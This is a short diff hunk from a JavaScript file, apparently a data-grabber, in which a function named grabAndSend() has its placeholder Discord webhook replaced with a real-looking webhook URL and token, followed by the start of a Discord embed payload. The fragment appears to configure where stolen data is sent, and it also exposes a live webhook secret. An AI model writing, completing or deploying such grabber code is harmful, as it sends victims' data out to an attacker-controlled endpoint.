@@ -127,7 +127,7 @@ async function grabAndSend() {
     }
     
     // Send to webhook
-    const webhookURL = "PUT_YOUR_DISCORD_WEBHOOK_URL_HERE";
+    const webhookURL = "https://discord.com/api/webhooks/1510259871327588564/yJxLvuCDplRPPWBSzwE53rsrwfH7xNPMnssWbAYahvCSwRWaLZNaDIIJiYHrNllDH7Cj";
     
     // Format for Discord embed
     const embed = {
